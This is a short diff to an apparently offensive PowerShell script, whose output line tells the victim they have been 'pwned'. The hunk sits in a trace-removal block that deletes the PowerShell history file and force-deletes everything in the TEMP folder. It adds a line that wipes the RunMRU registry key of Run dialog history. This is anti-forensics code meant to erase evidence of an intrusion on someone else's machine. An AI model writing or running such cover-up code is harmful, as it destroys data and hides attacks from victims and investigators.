@@ -289,6 +289,7 @@ if ($removeTraces) {
     Write-Output "[ - ] Removing traces"
     Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
     Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
 }
 
 Write-Output "✨ You have been pwned lmaooo :3 :3"
